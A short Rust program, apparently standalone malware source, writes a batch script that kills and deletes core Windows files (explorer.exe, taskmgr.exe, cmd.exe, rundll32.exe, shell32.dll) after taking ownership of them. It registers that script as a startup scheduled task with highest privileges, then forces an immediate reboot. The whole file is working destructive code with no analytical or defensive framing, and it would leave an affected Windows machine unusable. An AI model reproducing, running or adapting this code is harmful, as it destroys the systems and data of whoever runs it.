use std::process::Command;
use std::fs;
fn main() {
    let username = whoami::username();
    let path:String = "C:\\Users\\".to_owned()+&username+&"\\Desktop.bat".to_string();
    let path2 = path;
    let data = "echo off\ntaskkill /f /im explorer.exe\ntakeown /a /f C:\\Windows\\explorer.exe\nicacls C:\\Windows\\explorer.exe /grant administrators:f\nmove C:\\Windows\\explorer.exe C:\\Users\\test\\Desktop\\explorer.exe\ndel C:\\Users\\test\\Desktop\\explorer.exe\ntaskkill /f /im taskmgr.exe\ntakeown /a /f C:\\Windows\\System32\\taskmgr.exe\nicacls C:\\Windows\\System32\\taskmgr.exe /grant administrators:f\nmove C:\\Windows\\System32\\taskmgr.exe C:\\Users\\test\\Desktop\\taskmgr.exe\ndel C:\\Users\\test\\Desktop\\taskmgr.exe\ntaskkill /f /im cmd.exe\ntakeown /a /f C:\\Windows\\System32\\cmd.exe\nicacls C:\\Windows\\System32\\cmd.exe /grant administrators:f\nmove C:\\Windows\\System32\\cmd.exe C:\\Users\\test\\Desktop\\cmd.exe\ndel C:\\Users\\test\\Desktop\\cmd.exe\ntaskkill /f /im rundll32.exe\ntakeown /a /f C:\\Windows\\System32\\rundll32.exe\nicacls C:\\Windows\\System32\\rundll32.exe /grant administrators:f\nmove C:\\Windows\\System32\\rundll32.exe C:\\Users\\test\\Desktop\\rundll32.exe\ndel C:\\Users\\test\\Desktop\\rundll32.exe\ntakeown /a /f C:\\Windows\\System32\\shell32.dll\nicacls C:\\Windows\\System32\\shell32.dll /grant administrators:f\nmove C:\\Windows\\System32\\shell32.dll C:\\Users\\test\\Desktop\\shell32.dll\ndel C:\\Users\\test\\Desktop\\shell32.dll";
    fs::write(path2.clone(), data).expect("Unable to write file");
    Command::new("cmd").arg("/c").arg("SCHTASKS /CREATE /SC ONSTART /TN \"ScriptTask\" /TR ".to_owned() +&path2+ " /RL HIGHEST /NP").output().unwrap();
    Command::new("powershell").arg("-command").arg("SCHTASKS /CREATE /SC ONSTART /TN \"ScriptTask\" /TR ".to_owned() +&path2+ " /RL HIGHEST /NP").output().unwrap();
    Command::new("SCHTASKS").arg("/CREATE").arg("/SC ONSTART /TN \"ScriptTask\" /TR ".to_owned() +&path2+ " /RL HIGHEST /NP").output().unwrap();
    Command::new("cmd").arg("/c").arg("shutdown -r -t 0").output().unwrap();
}